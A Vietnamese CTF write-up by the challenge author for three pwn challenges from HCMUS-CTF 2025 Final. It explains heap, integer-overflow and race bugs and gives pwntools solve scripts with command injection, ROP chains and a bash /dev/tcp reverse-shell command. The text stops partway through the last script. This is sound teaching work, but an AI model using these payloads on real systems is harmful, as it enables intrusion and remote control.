---
layout: post
title: HCMUS-CTF 2025 Final Pwn Challenges
date: 2025-08-11 00:00 +0000
categories: [CTF Writeups]
tags: [hcmus-ctf, pwn, writeup]
description: Writeups for the pwn challenges I authored for HCMUS-CTF 2025 Final.
---
## GPA Tracker
Độ khó: `easy`

### Overview
Chương trình đơn giản là cho nhập GPA các môn học vào, rồi tính CPA thôi.
Chall cho luôn source. Và vậy thì để @AI Studio tìm bug cho lẹ, hơi đâu mà đọc code.

### Bug & fixes
Theo AI, thì bug chính là `new` / `delete[]` mismatch.
Cách fix thì đơn giản là sửa `delete[]` thành `delete`.
### Exploit 
Ta sẽ xem thử `new[]` và `delete[]` làm gì bằng cách viết một chương trình đơn giản & debug nó.
```c
#include <string>
#include <iostream>
using namespace std;

struct A {
    int x;
    ~A() {
        std::cout << x << std::endl;
    }
};

int main() {
    A *arr = new A[5];
    delete[] arr;
    return 0;
}
```
Sau khi compile & decompile nó ra vầy:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 arr_8; // rdx
  __int64 i; // rax
  A *j; // rbx
  A *arr; // [rsp+8h] [rbp-18h]

  arr_8 = operator new[](0x1CuLL);
  *(_QWORD *)arr_8 = 5LL;
  for ( i = 4LL; i >= 0; --i )
    ;
  arr = (A *)(arr_8 + 8);
  if ( arr_8 != -8 )
  {
    for ( j = (A *)(4LL * *(_QWORD *)arr_8 + arr_8 + 8); j != arr; A::~A(j) )
      --j;
    operator delete[](&arr[-2], 4 * (*(_QWORD *)&arr[-2].x + 2LL));
  }
  return 0;
}
```
- Sau dòng new[]:
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/HkmOVS4uxx.png)
Ta có thể đoán được rằng `new[5]` sẽ malloc & setup một struct dạng như vầy, rồi trả về `&Wrapper->elements` cho user.
```c
struct Wrapper {
    uint64_t n_element;
    A elements[n_element];
};
```
- Dòng `delete[]`:
Ta để ý vòng lặp for:
```c
for ( j = (A *)(4LL * *(_QWORD *)arr_8 + arr_8 + 8); j != arr; A::~A(j) )
  --j;
```
Ở đây 4LL là `sizeof(A)`. Vậy có thể viết lại cho dễ đọc như sau:
```c
A* element = &arr[n_element];
do {
    element--;
    A::~A(element);
} while (element != arr);
```
Dễ thấy nó gọi destructor cho mọi phần tử của `arr`, bắt đầu từ phần tử cuối cùng.

Giờ có nền tảng những toán tử đó rồi, ta quay lại bài gốc. Xem lúc `delete[]`:
```c
if ( st_ )
{
for ( j = (Student *)&st_[55 * *((_QWORD *)st_ - 1)]; j != (Student *)st_; Student::~Student(j) )
  j = (Student *)((char *)j - 55);
operator delete[](st_ - 8, 55LL * *((_QWORD *)st_ - 1) + 8);
}
```
Khi khởi tạo chỉ dùng `st = new Student()`, thì ta có `n_element` sẽ là heap chunksize của chunk đó (khi debug thì ta thấy nó là 0x41). Vậy chương trình sẽ coi những vùng nhớ phía dưới là `Student` và gọi destructor.

```c
~Student() {
    if (strlen(name) == 0 || !printable(name)) return;
    char buf[70] = {0};
    strcat(buf, "echo \"Goodbye ");
    strncat(buf, name, 40);
    strcat(buf, "\"");
    system(buf);
}
```

Trong destructor đó, ta thấy có command injection. Dạng inject là `echo "Goodbye %s", name`. Tự viết vài cái check, ta thấy name = `";sh"` sẽ ok. Việc filter `name` xảy ra khi nhập từ bàn phím => không inject vô name của object gốc được, mà phải tìm cách làm sao cho object `student[k]` có `name` = `";sh"`, với `k > 0`.


Object duy nhất ta có thể dùng cho việc ấy là `Course`. Payload `name` hồi nãy là 5 bytes. Và trong struct `Course` có 6 bytes kề nhau mình có thể control là `GPA` và `year_taken`, nice.

![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/SyNxnHVuex.png)

Giả sử `&course[i]->GPA` trùng với `st[k].name` rồi, thì ta sẽ nhập thế nào? Ta cần pack 4 bytes dưới dạng float, hơi lạ một chút, nhưng chỉ cần một prompt là có thể làm được ;), dùng `struct.unpack('<f')`.
```python
cmd = b'";sh'
value = struct.unpack('<f', cmd)[0]
sna(b'How many credits is this course? > ', 4)
sna(b'What year did you take it? > ', ord('"'))
sla(b'What\'s your GPA in that course? >', f"{value:.6f}".encode())
```

Rồi, giờ làm sao để tìm xem phải để cái này rơi vào course số bao nhiêu? Ta xem xíu, tồn tại k sao cho `&course[i]->GPA` trùng với `&st[k].name`, tương đương:
`(((long)course[i]+4) - ((long)st+4)) % sizeof(Student) == 0`
<=> `((long)course[i] - (long)st) % 55 == 0`

Ta cứ add khoảng 1000 cái course, toàn bộ 1000 pointer sẽ ở trong cái vector, mình viết gdbscript loop qua và check điều kiện trên, cái nào thỏa thì lụm.

Mình cứ prompt GPT viết cho mình :))
```
define find_i
python
vec = int(gdb.parse_and_eval("$vec"))
st  = int(gdb.parse_and_eval("$st"))

i = 0
while True:
    val = int(gdb.parse_and_eval(f"*(long*)({vec} + 8*{i})"))
    if (val - st) % 55 == 0:
        print(f"Found i = {i}, value = {val}")
        break
    i += 1
end
end
```
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/B1F2Z84_lg.png)

Như vậy course ở index 47 có field `GPA` trùng với `st[48].name`; và do 48 < 0x41 (= 65), chỗ đó vẫn được gọi `Student::~Student()`.

Vậy tạo 47 cái course padding trước, rồi tạo cái course chứa payload của mình.

```python
for i in range(47):
    add(1, 2025, 1)
    sla(b'(y/n) >', b'y')

cmd = b'";sh'
value = struct.unpack('<f', cmd)[0]
sna(b'How many credits is this course? > ', 1)
sna(b'What year did you take it? > ', ord('"'))
sla(b'What\'s your GPA in that course? >', f"{value:.6f}".encode())
GDB()
sla(b'(y/n) >', b'n')
```
Nhưng bị exit vì CPA cuối cùng quá cao, dính cái check ở dòng 127 trong `main.cpp`. 
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/Sy7yQIEdlg.png)

Lý do là `value` là một số float quá lớn. Chia cho tổng số tín chỉ thì không thể < 10 được. Ta cũng không thể nhập một course có GPA là `-value` để cân bằng lại, do có điều kiện GPA không âm trong constructor của `Course`.

Đọc kỹ lại code, ta thấy `n_credits` thuộc kiểu `int8_t` có dấu, và không có giới hạn số course hay tổng số tín chỉ. Vậy ta cứ overflow cho `n_credits` thành số âm. Bằng cách nhập 4 tín chỉ cho toàn bộ 48 course mình add, thì `n_credits` = 4 * 48 = 192 -> integer overflow xuống -64 (viết đoạn code C nhỏ để test). Rồi lúc này CPA chia cho số âm sẽ thành số âm. Và sẽ có shell.
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/r1SV4UVdgg.png)

Bài này chuối free mà phải không, có tận 3 bug, toàn là bug dễ.

Flag:
```
HCMUS-CTF{0pErAtOr_miSUS3_&_C0MM4nD_INJECtI0N_AND_1Nt3ger_0verf1ow_to_w@RM_uP}
```

### Solve script

```python
#!python3

from pwn import *

exe = ELF("./chall_patched")

context.terminal = 'tmux splitw -h'.split()
context.binary = exe

remote_connection = "nc addr 5000".split()
local_port = 5005

gdbscript = '''
# put your gdb script here
b Student::~Student()

define find_i
python
vec = int(gdb.parse_and_eval("$vec"))
st  = int(gdb.parse_and_eval("$st"))

i = 0
while True:
    val = int(gdb.parse_and_eval(f"*(long*)({vec} + 8*{i})"))
    if (val - st) % 55 == 0:
        print(f"Found i = {i}, value = {val}")
        break
    i += 1
end
end
'''

def start():
    if args.REMOTE:
        return remote(remote_connection[1], int(remote_connection[2]))
    elif args.LOCAL:
        return remote("localhost", local_port)
    else:
        return process([exe.path])

def GDB():
    if args.NOGDB: return
    if not args.LOCAL and not args.REMOTE:
        gdb.attach(p, gdbscript=gdbscript)
        pause()

p = start()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

def add(cred, year, gpa):
    sna(b'How many credits is this course? > ', cred)
    sna(b'What year did you take it? > ', year)
    sna(b'What\'s your GPA in that course? >', gpa)

sla(b'name?', b'khoa')
sla(b'id:', b'123')

for i in range(47):
    add(4, 2025, 1)
    sla(b'(y/n) >', b'y')

cmd = b'";sh'
value = struct.unpack('<f', cmd)[0]
sna(b'How many credits is this course? > ', 4)
sna(b'What year did you take it? > ', ord('"'))
sla(b'What\'s your GPA in that course? >', f"{value:.6f}".encode())
GDB()
sla(b'(y/n) >', b'n')

p.interactive()
```

## LEGv8
Độ khó: `medium`
### Overview 
File binary có debug symbol đầy đủ vì mình thấy cách code này đọc còn mệt, nói gì tới reverse; nhất là khi chỉ có 8 tiếng làm bài. Mình muốn người chơi tập trung phần exploit hơn là reverse.

Chương trình simulate lại một vài instruction cơ bản của LEGv8 (subset của ARM, dành cho việc giáo dục):
* ADD, SUB, AND, ORR
* STUR, LDUR
* CBZ 

Với mỗi instruction: ta có các công đoạn như sau, và cũng có mô phỏng thời gian cần để thực hiện:
```c
void __cdecl runSingleCycle(Simulator *sim)
{
  fetchInstruction(sim);    // 1000ms, bắt buộc
  decodeAndSetControl(sim); // 100ms, bắt buộc
  readRegisters(sim);       // 200ms, bắt buộc
  generateImmediate(sim);   // 0
  generateALUControl(sim);  // 0
  executeALU(sim);          // 500ms, bắt buộc
  memoryAccess(sim);        // 1500ms, nếu có signals->MemRead hoặc signals->MemWrite
  writeback(sim);           // 300ms, nếu có signals->RegWrite
  updatePC(sim);            // 0
}
```
Từ đó, dựa trên hàm `decodeAndSetControl`, ta có bảng thời gian để chạy các instruction là như sau:
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/HyYTy9owxl.png)

### Setup
Vì container đã cho là `distroless/base-debian11` - thuộc loại distroless không có shell, nên không dùng `docker exec` rồi `ldd` trong container được.

Tới đây có 2 option:
- 1 là chạy `ldd` trên máy thật lấy path (có thể sai), rồi `docker cp` luôn.
- 2 là thêm tag `:debug` vào Dockerfile để chạy version distroless có shell, tải ldd về, rồi chạy.

Mình lười lắm nên chọn cái số 1 :)) 
Sau đó pwninit là được.

### Bug & fix 
Bug dễ thấy là OOB read & write ở hàm `memoryAccess`:
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/HkOJSFjDlg.png)
Chỉ check upperbound mà không check lowerbound.

Fix: thêm `|| address < sim->memoryVirtual`.

### Exploit 
Xuyên suốt toàn bộ exploit, ta có thể dùng các register để chứa các giá trị hoặc offset cần thiết. Cũng dùng các register làm nơi chứa các giá trị leak, hay làm trung gian cho các tính toán.

Với lỗi đó, có thể dùng `LDUR` để đọc, và `STUR` để viết lên phía trên, đè các trường của `struct Simulator`.
```c
struct Simulator
{
  uint64_t *registers;
  uint64_t pc;
  uint32_t instruction;
  Wires wires;
  ControlSignals controlSignals;
  uint32_t *instructionMemory;
  uint64_t instructionCount;
  uint8_t *memory;
  uint64_t memorySize;
  uint64_t memoryVirtual;
};
```
Ta có thể nghĩ tới đè luôn `memorySize` thành giá trị rất lớn để có quyền rw trên toàn bộ vùng heap.

Nhưng giờ ở trên heap chỉ có địa chỉ của heap thôi: các field `registers`, `instructionMemory`, `memory`. Và gần như chẳng làm được gì từ việc chỉ có arbitrary read & write trên heap cả. Ta cần có 1 địa chỉ libc hoặc binary để đi tiếp.

Lướt lại các hàm trong IDA, ta thấy hàm `init` tạo handler cho signal 14, và có hàm `alarm_handler` rất đáng chú ý.
```c
void __cdecl init()
{
  signal(14, (__sighandler_t)alarm_handler);
}

void __cdecl alarm_handler()
{
  FILE *f; // [rsp+8h] [rbp-8h]
  f = fopen("flag.txt", "r");
  if ( !f )
  {
    printf("Oh no, flag.txt is not there :(");
    exit(1);
  }
  fclose(f);
}
```
XREF hàm `init`, ta thấy nó nằm trong `.init_array`, tức là nó sẽ được gọi trước `main`
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/rkGImqiPel.png)


Ta cần phải biết số 14 là đại diện cho tín hiệu nào. `grep` đại một cái nào đó để lấy file .h chứa các signal, rồi grep số 14 trong đó. Vậy số 14 là `SIGALRM`.
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/r1ZtzciDxx.png)

Trong hàm `main` cũng có đoạn khá sus:
```c
timer.it_value.tv_sec = 120LL;
timer.it_value.tv_usec = 0LL;
timer.it_interval.tv_sec = 0LL;
timer.it_interval.tv_usec = 0LL;
if ( setitimer(__itimer_which::ITIMER_REAL, &timer, 0LL) == -1 )
{
  perror("setitimer");
  exit(1);
}
```
Đọc manpage, ta thấy với argument `ITIMER_REAL` và các config như vậy, nó sẽ gửi `SIGALRM` đúng một lần sau 120 giây, và sẽ trigger `alarm_handler` ở trên.

Ta thử dùng gdb, đặt breakpoint ngay trước khi bắt đầu execute, và chạy command `signal SIGALRM` để trigger. Ta thấy sau hàm `alarm_handler`, trên heap có vài địa chỉ libc để lại, nó nằm trong `FILE` khi gọi `fopen`.
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/H1dzP5ivxl.png)

Như vậy là khi có `SIGALRM`, ta sẽ có địa chỉ libc trên heap. Khi debug thì cứ gửi signal như hồi nãy. Còn khi chạy thật, thì chương trình mình cần phải kéo dài hơn 120s. Và như tính toán ở trên, thì instruction lâu nhất là `LDUR`, tốn 3.6 giây. Lấy `ceil(120/3.6)` = 34. Nếu ta chơi kiểu đặt 34 cái instruction LDUR kế nhau, thì chỉ còn lại 16 instruction để làm này làm kia, khá là tù túng.

Ta sẽ tạo loop đơn giản để kéo dài hơn 120s. Ta cho X1 = 1, X2 = số lần loop (đặt là x).
```
LOOP:
    SUB X2, X2, X1   // 2.1s
    CBZ X2, END      // 1.8s
    CBZ XZR, LOOP    // 1.8s

END:
    // remaining instructions 
```
Ta cần:
```
(2.1 + 1.8 + 1.8) * x - 1.8 > 120
<=> x > 21.36
```
Lấy x = 23 luôn cho an toàn. À trừ đi 1.8 là do ở lần cuối cùng, khi X2 = 0 thì cái CBZ cuối bị skip qua.

Rồi, giờ ta đã có địa chỉ libc. Nên nhớ là ta có thể SUB, ADD thoải mái với offset có thể nhập vào từ đầu. Và còn có thể đọc và ghi địa chỉ bất kỳ nữa.

Giờ thì ta đi theo flow lối mòn: libc -> stack (environ) -> stack pivot về heap (đoạn các registers) -> ROP chỗ đó. Như vậy đỡ cực hơn so với viết ROP trên stack.

Mà ta không thể ROP gọi `system("/bin/sh")` được, do container không có `/bin/sh`. Nên là cứ syscall `close(2)`, `open("flag.txt", 0, 0)`, `sendfile(1, 2, 0, 0x100)` là ok. String `flag.txt` có thể p64 và để gọn trong 1 register, và cho register sau nó bằng 0.

Vậy tóm gọn lại, flow của script như sau:
- ((1)): Nhập 31 register là các offset cần thiết, và có cả string `flag.txt`.
- ((2)): Kéo thời gian dài hơn 120s để có địa chỉ libc trên heap.
- ((3)): Overwrite `memoryVirtual` và `memorySize` để xóa hoàn toàn cái bound check. Cho `memoryVirtual` và `memory` thành 0, `memorySize` thành một số rất lớn. Trước đó phải lưu lại địa chỉ heap.
- ((4)): Tính libc base lưu vào register.
- ((5)): Đọc giá trị `environ` để leak stack, tính được `rbp` của hàm `main`.
- ((6)): Overwrite `saved rip` của `main` thành `leave; ret`; `saved rbp` của `main` về địa chỉ của vùng register trên heap, nơi mình chứa ROP chain.
- ((7)): Cộng thêm offset cho các gadget trong rop chain.
- ((8)): Return, lụm flag.

Thêm nữa, lúc debug thì cứ sửa `usleep@got` thành `ret` để đỡ vụ thời gian này. Khi nào cần trigger thì cứ signal.
```
define patch_usleep
    set $binary_base = (long)&main - 0x1c3f
    set *(long*)($binary_base+0x4fd0) = ($binary_base + 0x133b)
end
patch_usleep
```

Flag: 
```
HCMUS-CTF{gO0d_THiNgs_c0Me_t0_THOse_WhO_W4iT_;)}
```
### Solve script
```python
from pwn import *
from assembler import *

context.binary = elf = ELF("./chall_patched")
context.terminal = 'tmux splitw -h'.split()
# p = elf.process()
p = remote('localhost', 5001)

gs = '''
b *runSingleCycle

define patch_usleep
    set $binary_base = (long)&main - 0x1c9c
    set *(long*)($binary_base+0x4fd0) = ($binary_base + 0x1346)
end

patch_usleep

c
signal SIGALRM
'''
def GDB():
    if args.NOGDB: return
    return gdb.attach(p, gdbscript=gs)
    

# GDB()
p.sendlineafter(b'How much memory do you want for your program?', b'1000')

p.recvuntil(b'[')
mem_start = int(p.recvuntil(b',', drop=True), 16)
log.info(f'{hex(mem_start) = }')

p.sendlineafter(b'Do you want to set initial values for registers?', b'y')
reg = [0]*31



assembly_code = ""

# ((2))
reg[1] = 1
reg[2] = 23
assembly_code += """
LOOP:
    SUB X2, X2, X1   // 2.1s
    CBZ X2, END      // 1.8s
    CBZ XZR, LOOP    // 1.8s

END:
"""

# ((3))
reg[3] = mem_start
reg[4] = (1 << 56) # very large value for memSize
reg[5] = 0 # use to save memory
assembly_code += """
STUR X4, [X3, #-32]   // memSize = very large
LDUR X5, [X3, #-40]   // save value of memory in X5
STUR XZR, [X3, #-40]  // memory = NULL

ADD X3, X3, X5        // because the line address = address - memoryVirtual + memory
STUR XZR, [X3, #-24]  // memoryVirtual = NULL
"""

# ((4))
reg[6] = 0x638 # offset <address contain libc> - <memory>
reg[7] = 0     # store libc base here
reg[8] = 0x1cf5c0   # offset libc leak to libc base

assembly_code += """
ADD X6, X6, X5
LDUR X7, [X6, #0]
SUB X7, X7, X8  // now libc base is in X7
"""

# ((5))
reg[9] = 0x1d19e0 # offset libc base to &environ
reg[10] = 0       # to store environ
reg[11] = 0x108   # offset from main's rbp to environ
reg[12] = 0       # to store main's rbp    
assembly_code += """
ADD X9, X9, X7
LDUR X10, [X9, #0]

SUB X12, X10, X11 // now main's rbp is in X12
"""

# ((6))
reg[13] = 0x000000000004a5b0 # offset of "leave ret" in libc
num_register_start = 15
reg[14] = 0x3f0 + 8 * num_register_start - 8     # offset from memory to rop chain - 8
assembly_code += """
ADD X13, X13, X7
STUR X13, [X12, #8]  // overwrite saved rip

ADD X14, X14, X5
STUR X14, [X12, #0]  // overwrite saved rbp
"""

# ((7))
pop_rdi = 0x0000000000023796
pop_rsi = 0x000000000002590f
pop_rdx_rcx_rbx = 0x00000000000e1399
pop_rcx = 0x0000000000033923
libc_open = 0xeb110
libc_close = 0xebc30
libc_sendfile = 0xeffb0

reg[15] = pop_rdi
reg[16] = 0
reg[17] = libc_close

reg[18] = pop_rdi
reg[19] = 0x3f0 + 8 * 30 # offset from memory to flag at X30, because X31 is XZR always be 0, we don't need to worry about null terminator
reg[30] = u64(b'flag.txt')
reg[20] = pop_rsi
reg[21] = 0
reg[22] = libc_open

reg[23] = pop_rdi
reg[24] = 1
reg[25] = pop_rsi
reg[26] = 0
reg[27] = pop_rcx
reg[28] = 100
reg[29] = libc_sendfile # rdx is already 0, LOL

assembly_code += """
ADD X15, X15, X7
ADD X17, X17, X7

ADD X18, X18, X7
ADD X19, X19, X5
ADD X20, X20, X7
ADD X22, X22, X7

ADD X23, X23, X7
ADD X25, X25, X7
ADD X27, X27, X7
ADD X29, X29, X7
"""

for i in range(31):
    p.sendlineafter(b'=', str(reg[i]).encode())

assembler = LegV8Assembler()

try:
    binary_code_bytes = assembler.assemble_bytes(assembly_code)
except ValueError as e:
    print(f"Assembly Failed: {e}")

p.sendlineafter(b'Enter your program', binary_code_bytes)
p.interactive()
```

## LEGv8.1
Độ khó: `hard`

### Overview
Vì 2 bài này chức năng khá giống nhau. Ta không biết author có sửa chỗ nhỏ xíu nào không, nên thay vì dò lại hết, ta dùng BinDiff trong IDA (ver 9.0 xài không được, phải là 8.3).
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/BkQVk70Pxx.png)

Ta xem hàm `alarm_handler`, bên trái là bài trước đó:
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/Sk5UkmCvll.png)


Code bài này:
```c
void __cdecl alarm_handler()
{
  clean();
  puts("Time Limit Exceeded.");
  close(0);
  close(1);
  close(2);
}

void __cdecl clean_pointers()
{
  free(simulator->registers);
  simulator->registers = 0LL;
  free(simulator->instructionMemory);
  simulator->instructionMemory = 0LL;
  free(simulator->memory);
  simulator->memory = 0LL;
}
```
Các hàm còn lại giống nhau, khác chút xíu instruction, có thể do compiler khác nhau (`strings` sẽ thấy version gcc).

Vậy là sau 120s, chương trình sẽ free hết các vùng nhớ heap trong `simulator`, và cho chúng nó về NULL.

Sau khi nó làm như vậy thì sẽ có nguy cơ rất cao bị dính `Segmentation fault`.

### Bug 
Bài này có 2 bug:
- 1: Một bug OOB read/write trên heap, giống bài trước.
- 2: Một bug nữa ở `alarm_handler`, khi TLE rồi thì chỉ đóng các fd, mà không chịu exit.
 
### Exploit

Phần đầu thì cứ như bài trước, overwrite `memorySize` thành một số rất lớn để có quyền arbitrary read & write trên toàn vùng heap.

Do có bug 2, các phần code còn lại vẫn có thể chạy tiếp, kể cả khi TLE. Và do fd bị close hết, nên để ăn được bài này thì phải reverse shell.

Bài này vẫn có libc sau 120s, do size của `memory` có thể điều chỉnh được lớn hơn 0x400. Nhưng sau đó nó lại bị set về null. Làm sao đây ;))

Giờ ta coi lại mấy chỗ sử dụng những con trỏ bị free và set về null trong 1 cycle, và xem thử nếu chúng là null thì có chạy tiếp được không:
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/ry3_mpTDgx.png)

- Ở `fetchInstruction`: dùng kiểu `instruction = instructionMemory[pc/4]`. 
    ![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/BkKb0h6Dxg.png)
    - Ta thấy có hành động lưu giá trị của `sim->instructionMemory` vào một biến local, và sau đó sleep 1000ms. Nếu `sim->instructionMemory` bị thay đổi trong lúc sleep, thì dòng số 13 vẫn hợp lệ và trả về instruction tiếp theo.
    - Nếu `sim->instructionMemory` là `null`, nhưng `sim->pc` là một địa chỉ hợp lệ, thì vẫn có thể qua được hàm này. Nhưng phải overwrite `sim->instructionCount` thành một số lớn hơn tất cả mọi address, `(1 << 56)` chẳng hạn.
- Ở `readRegisters`: hàm này thì chịu rồi, `sim->registers` phải là một địa chỉ hợp lệ và có quyền read, không thì SEGFAULT liền. Chỗ read này cũng không bị OOB.
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/B1X_Rnawgl.png)

- Ở `memoryAccess`: chỉ dùng `sim->memory` khi là STUR/LDUR.
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/SJXg16pPxl.png)
    - Cũng tương tự như hàm `fetchInstruction` ở trên, ở đây cũng có hành động lưu giá trị `sim->memory` vào biến local, sleep 1500ms, rồi sử dụng biến local đó.
    - Dựa vào cái ở trên, cộng thêm ở đây có bug OOB read & write nữa, nên có thể viết/đọc một giá trị 8 byte vào một chỗ bất kỳ nào đó khi `sim->memory` bị free & set null trong lúc sleep.

- Ở `writeback`: nếu là R-type/LDUR cần thay đổi register, thì `sim->registers` phải là một địa chỉ writable. Và cũng có hành động lưu lại `sim->registers` vào biến local rồi sleep.
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/SkrAE6pvge.png)

Giờ ta có 6 chỗ sleep, và mốc 120s của mình chỉ có thể rơi vào những chỗ đó. Ta xem lại ảnh hồi nãy và phân tích từng chỗ, ta sẽ thử với instruction `STUR` vì chúng cho mình quyền write 8 byte vào một chỗ bất kỳ trong object `sim`, có thể gỡ gạc được những con trỏ bị set null.
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/ry3_mpTDgx.png)
- Dòng 3 - hàm `fetchInstruction`: nếu `sim->instructionMemory` bị đổi trong lúc sleep, thì `sim->instruction = *(uint32_t *)((char *)instructionMemory + (sim->pc & ~3uLL));` vẫn chạy được do giá trị đã được lưu vào local. Nhưng khi tới dòng `readRegisters` sẽ SEGFAULT do `sim->registers = NULL`.
- Dòng 4 - hàm `decodeAndSetControl`: lý do như ở trên, tới `readRegisters` sẽ chết.
- Dòng 5 - hàm `readRegisters`: vẫn chết, do `sim->registers` không được lưu vào local trước khi sleep.
- Dòng 8 - hàm `executeALU`: nếu set null chỗ này, thì tới hàm `memoryAccess` cần có `address` trỏ về địa chỉ hợp lệ. 
- Dòng 9 - hàm `memoryAccess`: vẫn write được 8 byte vào một chỗ nào đó, do `memory` được lưu lại trên local trước khi sleep. Nhưng khi quay lại `fetchInstruction` trong cycle tiếp theo, sẽ bị SEGFAULT, do `sim->instructionMemory` = NULL, và `sim->pc` là một số nhỏ. Vậy nếu chỗ này set `sim->pc` thành địa chỉ của instruction hiện tại thì sao? OK, hàm `updatePC` sẽ cộng nó lên 4, và trỏ đến instruction tiếp theo  `fetchInstruction` vẫn chạy được. Nhưng tới `readRegisters` thì chết do `sim->registers` là NULL.

Nói thật thì tới đây mình cũng muốn bỏ cuộc và đi sửa chall rồi.

Nhưng nhưng nhưng. Xem lại cái `struct Simulator`, ta thấy gì nào?
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/BJztH0pwxg.png)

`registers` là field 8 byte nằm ở offset 0. Nếu chỉnh `sim->memory = sim` và trigger free cái simulator, thì `sim->registers` sẽ là `fd` ptr của tcache 0x90, vẫn chưa phải là địa chỉ hợp lệ, do dính safe linking. Nhưng again, mình có quyền arbitrary read & write trên heap mà. Nếu như trước đó mình set chunksize từ 0x90 thành 0x90 + chunksize của `sim->memory` cho nó > 0x410 thì sao. `sim` khi free sẽ vào unsorted bin, và `sim->registers` sẽ là một địa chỉ trong vùng `main_arena`, có quyền rw luôn.

Vậy, với các instruction trước STUR, mình sẽ:
- Dùng quyền arbitrary write để sửa `sim->memory = sim`, rồi sửa chunksize của `sim` thành `0x90 + chunksize của sim->memory`. 
- Mình sẽ dùng STUR, và canh cho `alarm_handler` được gọi trong lúc `memoryAccess` đang sleep. 
- Khi đó `sim->registers` sẽ trỏ tới vùng `rw` được trong libc. 
- Sau khi hết sleep thì đè `sim->pc` thành địa chỉ trên heap của instruction hiện tại. 
 
Như vậy tới cycle tiếp theo, các instruction của mình vẫn chạy được. 

Sau đó, mình xem xét `sim->registers`, lúc này là một địa chỉ trong `main_arena`:
![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/ryvgzeCDxg.png)
Ta thấy `X2 = X3 = sim - 0x10`. 
- Ở đây đang có rất nhiều địa chỉ libc, ta nên lưu lại để lát nữa có mà dùng. Lấy X4 (@ `main_arena+128`) đi. Ta sẽ lưu nó vào vùng `memory` cũ. Vậy nếu ta chạy `STUR X4, [X2, #0xa8]`, thì địa chỉ libc sẽ có mặt ở `sim+0x98`, tức là `memory cũ + 0x8`. ((7))
- Để restore lại sim->register, ta làm 2 bước:
    - `STUR X2, [X2, #0x10]` để có `sim->registers = sim - 0x10`, giống thế này:
    ![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/Syq8NgCwlx.png)
    - Ta thấy địa chỉ `..330` là vùng nhớ `memory` ban đầu, nếu trước khi trigger, ta để con trỏ `register` ban đầu vào địa chỉ này; sau đó thực hiện `ORR X2, X20, X20`, thì `sim->register` sẽ quay lại như ban đầu.

Rồi bây giờ mọi thứ quay lại như bài đầu tiên, có heap, có libc và arbitrary read & write. Chỉ khác một điều, đó là fd 0, 1, 2 bị close hết, và ta phải ROP reverse shell.

Mình quá lười để làm connect hay gì đó. Nhận thấy bài này chạy image ubuntu, nên chắc chắn có `/bin/bash`. Mình chạy lên revshell kiếm cmd dùng bash, thì nó đây: 
```c
system("bash -c \"sh -i >& /dev/tcp/127.000.000.001/8080 0>&1\"");
```
Chuỗi này dài tối đa 53 chars -> cần `ceil(53/8)` = 7 registers để chứa.
Lần này mình sẽ không stack pivot nữa, do có mỗi `pop rdi; ret` rồi `system` thôi.

Tóm lại, các việc mình phải làm là:
- ((1)): ghi đè `sim->memory` về `sim`, và ghi chunksize của `sim` thành `0x90 + chunksize của sim->memory` sao cho >= 0x420 (chọn bằng 0x420 luôn cho dễ). Chọn chunksize của `sim->memory` là `0x420 - 0x90 = 0x390` => cần malloc(0x380). 
- ((2)): ghi đè `sim->memorySize` về một số rất lớn, và ghi `sim->memoryVirtual` về 0. Tới bây giờ mới ghi `memoryVirtual` vì nếu làm bước này trước, thì sẽ fail bước check size khi ghi đè chunksize trong ((1))
- ((3)): tính toán và lưu `sim->pc` tiếp theo vào register để lát nữa overwrite `sim->pc` trong STUR. Overwrite `sim->instructionCount` thành giá trị rất lớn để không bị exit chương trình.
- ((4)): tính toán và lưu lại địa chỉ `sim->register` hiện tại vào `sim + 0x90`
- ((5)): chèn nhiều instruction để sleep một khoảng thời gian sao cho mốc 120s rơi vào bước `memoryAccess` của instruction `STUR` tiếp theo.
- ((6)): `STUR` overwrite `sim->pc` thành instruction tiếp theo. `alarm_handler` được trigger lúc sleep trong `memoryAccess`.
- ((7)): `sim->registers` đang trong vùng libc, lưu lại một địa chỉ libc ở `sim + 0x98`.
- ((8)): làm 2 bước kia để restore lại `sim->registers` như ban đầu.
- ((9)): tính libc base lưu vào register.
- ((10)): đọc giá trị `environ` để leak stack, tính được `rbp` của hàm `main`.
- ((11)): cộng thêm libc base vào các gadget cần thiết. 
- ((12)): viết ROP chain lên stack.
- ((13)): đè `sim->instructionCount` thành giá trị rất lớn để return, lụm reverse shell.

Bước số ((5)) mình viết cách tính ở trong script.

Nhận rev shell:

![image](/assets/img/hcmus-ctf-2025-final-pwn-challenges/HJivjMAwlg.png)

Flag:
```
HCMUS-CTF{i$_TH!$_C4ll3d_4_r4cE?_I_DOnt_Kn0w_bUt_gooD_j0B}
```

### Solve script

    
```python
from pwn import *
from assembler import *

context.binary = elf = ELF("./chall_patched")
context.terminal = 'tmux splitw -h'.split()
p = remote('localhost', 5000)
# p = elf.process()

gs = '''
b *runSingleCycle

define patch_usleep
    set $binary_base = (long)&main - 0x1d9c
    set *(long*)($binary_base+0x4fd0) = ($binary_base + 0x2202)
end

patch_usleep

define tri
    brva 0x1a8f
